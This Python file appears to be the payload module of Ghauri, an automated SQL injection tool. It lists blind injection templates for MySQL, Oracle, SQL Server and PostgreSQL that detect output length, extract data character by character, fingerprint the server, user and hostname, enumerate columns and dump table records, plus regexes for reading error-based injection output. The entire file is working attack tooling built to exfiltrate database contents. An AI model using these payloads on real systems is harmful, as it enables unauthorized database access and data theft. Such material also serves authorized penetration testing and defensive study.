#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Modernized Ghauri payloads collection (payloads.py) – February 2026

Structure:
- Grouped by purpose (length detection, character extraction, metadata, enumeration, dumping)
- Each group is a dict[dbms: list[str] | dict[str, str]]
- Variants ordered from most reliable → most WAF-friendly / fallback
- Placeholders: {query}, {position}, {char}, {db}, {tbl}, {col}, etc.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Literal


# ──────────────────────────────────────────────────────────────────────────────
#  Helper types
# ──────────────────────────────────────────────────────────────────────────────

DBMS = Literal[
    "MySQL",
    "Oracle",
    "Microsoft SQL Server",
    "PostgreSQL",
    # "Microsoft Access",  # usually covered by MSSQL variants
]


@dataclass(frozen=True)
class PayloadVariant:
    """Single payload template + optional metadata"""
    template: str
    description: str = ""           # e.g. "most reliable", "WAF-friendly"
    confidence: float = 1.0         # 0.0–1.0 heuristic priority


# ──────────────────────────────────────────────────────────────────────────────
#  1. Length of output (number of characters)
# ──────────────────────────────────────────────────────────────────────────────

NUMBER_OF_CHARACTERS_PAYLOADS: dict[DBMS, list[PayloadVariant]] = {
    "MySQL": [
        PayloadVariant("LENGTH({query})", "standard LENGTH()", 0.98),
        PayloadVariant("CHAR_LENGTH({query})", "alternative", 0.90),
    ],
    "Oracle": [
        PayloadVariant("LENGTH({query})", "standard LENGTH()", 0.98),
    ],
    "Microsoft SQL Server": [
        PayloadVariant("LEN({query})", "standard LEN()", 0.98),
    ],
    "PostgreSQL": [
        PayloadVariant("LENGTH({query}::text)", "cast to text", 0.98),
    ],
}


# ──────────────────────────────────────────────────────────────────────────────
#  2. Extract single character from length string (used during binary search)
# ──────────────────────────────────────────────────────────────────────────────

LENGTH_CHAR_EXTRACTION: dict[DBMS, list[PayloadVariant]] = {
    "MySQL": [
        PayloadVariant("ORD(MID({query},{position},1))={char}", "standard MID+ORD", 0.95),
        PayloadVariant("ORD(MID(IFNULL({query},0x20),{position},1))={char}", "with IFNULL", 0.88),
    ],
    "Oracle": [
        PayloadVariant("ASCII(SUBSTR({query},{position},1))={char}", "standard SUBSTR+ASCII", 0.95),
        PayloadVariant("ASCII(SUBSTR(NVL({query},' '),{position},1))={char}", "with NVL", 0.90),
    ],
    "Microsoft SQL Server": [
        PayloadVariant("UNICODE(SUBSTRING({query},{position},1))={char}", "standard SUBSTRING+UNICODE", 0.95),
        PayloadVariant("ASCII(SUBSTRING(LTRIM(STR(LEN({query}))),{position},1))={char}", "via string conversion", 0.85),
    ],
    "PostgreSQL": [
        PayloadVariant("ASCII(SUBSTRING({query}::text FROM {position} FOR 1))={char}", "standard", 0.95),
        PayloadVariant("ASCII(SUBSTRING(COALESCE({query}::text, ' ') FROM {position} FOR 1))={char}", "with COALESCE", 0.90),
    ],
}


# ──────────────────────────────────────────────────────────────────────────────
#  3. Extract single character during data exfiltration
# ──────────────────────────────────────────────────────────────────────────────

DATA_CHAR_EXTRACTION: dict[DBMS, dict[str, list[PayloadVariant]]] = {
    "MySQL": {
        "binary": [
            PayloadVariant("ORD(MID({query},{position},1))={char}", "standard", 0.95),
            PayloadVariant("ORD(MID(IFNULL({query},0x20),{position},1))={char}", "safe null", 0.90),
            PayloadVariant("ORD(MID(CAST({query} AS NCHAR),{position},1))={char}", "cast", 0.85),
        ],
    },
    "Oracle": {
        "binary": [
            PayloadVariant("ASCII(SUBSTR({query},{position},1))={char}", "standard", 0.95),
            PayloadVariant("ASCII(SUBSTR(NVL({query},' '),{position},1))={char}", "safe null", 0.90),
        ],
    },
    "Microsoft SQL Server": {
        "binary": [
            PayloadVariant("UNICODE(SUBSTRING({query},{position},1))={char}", "standard", 0.95),
            PayloadVariant("UNICODE(SUBSTRING(ISNULL({query},' '),{position},1))={char}", "safe null", 0.90),
        ],
    },
    "PostgreSQL": {
        "binary": [
            PayloadVariant("ASCII(SUBSTRING({query}::text FROM {position} FOR 1))={char}", "standard", 0.95),
            PayloadVariant("ASCII(SUBSTRING(COALESCE({query}::text,' ') FROM {position} FOR 1))={char}", "safe null", 0.90),
        ],
    },
}


# ──────────────────────────────────────────────────────────────────────────────
#  4. Fingerprint / banner / current user / database / hostname
# ──────────────────────────────────────────────────────────────────────────────

PAYLOADS_BANNER: dict[DBMS, list[str]] = {
    "MySQL": ["VERSION()", "@@VERSION", "@@VERSION_COMMENT"],
    "Oracle": ["banner FROM v$version WHERE ROWNUM=1", "version FROM v$instance"],
    "Microsoft SQL Server": ["@@VERSION"],
    "PostgreSQL": ["VERSION()"],
}

PAYLOADS_CURRENT_USER: dict[DBMS, list[str]] = {
    "MySQL": ["CURRENT_USER()", "USER()", "SESSION_USER()"],
    "Oracle": ["USER FROM DUAL"],
    "Microsoft SQL Server": ["CURRENT_USER", "SYSTEM_USER", "user_name()"],
    "PostgreSQL": ["CURRENT_USER", "session_user", "current_user"],
}

PAYLOADS_CURRENT_DATABASE: dict[DBMS, list[str]] = {
    "MySQL": ["DATABASE()", "SCHEMA()"],
    "Oracle": ["SYS.DATABASE_NAME FROM DUAL", "global_name FROM global_name"],
    "Microsoft SQL Server": ["DB_NAME()"],
    "PostgreSQL": ["current_database()"],
}

PAYLOADS_HOSTNAME: dict[DBMS, list[str]] = {
    "MySQL": ["@@HOSTNAME"],
    "Oracle": ["host_name FROM v$instance"],
    "Microsoft SQL Server": ["@@SERVERNAME", "HOST_NAME()"],
    "PostgreSQL": ["inet_server_addr()"],
}


# ──────────────────────────────────────────────────────────────────────────────
#  5. Column count / name enumeration / record count / data dumping
# ──────────────────────────────────────────────────────────────────────────────

PAYLOADS_COLUMN_COUNT: dict[DBMS, list[str]] = {
    "MySQL": [
        "COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl}",
        "COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE {db} AND TABLE_NAME LIKE {tbl}",
    ],
    "PostgreSQL": [
        "COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl}",
    ],
    "Microsoft SQL Server": [
        "COUNT(name) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl})",
        "COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog={db} AND table_name={tbl}",
    ],
    "Oracle": [
        "COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE OWNER={db} AND TABLE_NAME={tbl}",
    ],
}

PAYLOADS_COLUMN_NAMES: dict[DBMS, list[str]] = {
    "MySQL": [
        "COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl} LIMIT {offset},1",
        "CONCAT_WS(0x7e,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl} LIMIT {offset},1",
    ],
    "PostgreSQL": [
        "COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl} OFFSET {offset} LIMIT 1",
    ],
    "Microsoft SQL Server": [
        "TOP 1 name FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}) AND name NOT IN (SELECT TOP {offset} name FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name={tbl}))",
    ],
    "Oracle": [
        "COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM rn FROM ALL_TAB_COLUMNS WHERE OWNER={db} AND TABLE_NAME={tbl}) WHERE rn = {offset}+1",
    ],
}

PAYLOADS_RECORD_COUNT: dict[DBMS, list[str]] = {
    "MySQL": [
        "COUNT(*) FROM {db}.{tbl}",
        "IFNULL(TABLE_ROWS,0) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={db} AND TABLE_NAME={tbl}",
    ],
    "PostgreSQL": ["COUNT(*) FROM {db}.{tbl}"],
    "Microsoft SQL Server": ["COUNT(*) FROM {db}.{tbl}"],
    "Oracle": ["COUNT(*) FROM {db}.{tbl}"],
}

PAYLOADS_RECORD_DUMP: dict[DBMS, list[str]] = {
    "MySQL": [
        "{col} FROM {db}.{tbl} LIMIT {offset},1",
        "CONCAT_WS(0x7e,{col}) FROM {db}.{tbl} LIMIT {offset},1",
    ],
    "PostgreSQL": [
        "{col}::text FROM {db}.{tbl} OFFSET {offset} LIMIT 1",
    ],
    "Microsoft SQL Server": [
        "TOP 1 {col} FROM {db}.{tbl} WHERE {col} NOT IN (SELECT TOP {offset} {col} FROM {db}.{tbl})",
    ],
    "Oracle": [
        "{col} FROM (SELECT {col}, ROWNUM rn FROM {db}.{tbl}) WHERE rn = {offset}+1",
    ],
}


# ──────────────────────────────────────────────────────────────────────────────
#  Regexes for error-based extraction
# ──────────────────────────────────────────────────────────────────────────────

ERROR_REGEXES = {
    "xpath":        r"(?isx)(XPATH.*error\s*:\s*\'~(?:\()?(?P<value>.*?))\'",
    "duplicate":    r"(?is)(?:Duplicate\s*entry\s*(['\"])(?P<value>.*?)(?:~)?(?:1)?\1)",
    "bigint":       r"(?isx)(BIGINT.*\s.*Injected~(?:\()?(?P<value>.*?))\~END",
    "double":       r"(?isx)(DOUBLE.*\s.*Injected~(?:\()?(?P<value>.*?))\~END",
    "geometric":    r"(?isx)(Illegal.*geometric.*\s.*Injected~(?:\()?(?P<value>.*?))\~END",
    "gtid":         r"(?isx)(?:Malformed.*?GTID.*?set.*?\'Injected~(?:\()?(?P<value>.*?))\~END",
    "json_keys":    r"(?isx)(?:Injected~(?:\()?(?P<value>.*?))\~END",
    "generic":      r"(?isx)(?:(?:r0oth3x49|START)~(?P<value>.*?)\~END)",
    "mssql_string": r"(?isx)(?:'(?:~(?P<value>.*?))')",
}


# ──────────────────────────────────────────────────────────────────────────────
#  Utility / template strings
# ──────────────────────────────────────────────────────────────────────────────

TEMPLATE_INJECTED_MESSAGE = """
Type:       {PAYLOAD_TYPE}
Title:      {TITLE}
Payload:    {PAYLOAD}
Parameter:  {PARAMETER}
Vector:     {PREPARED_VECTOR}
Backend:    {BACKEND}
"""

# End of file
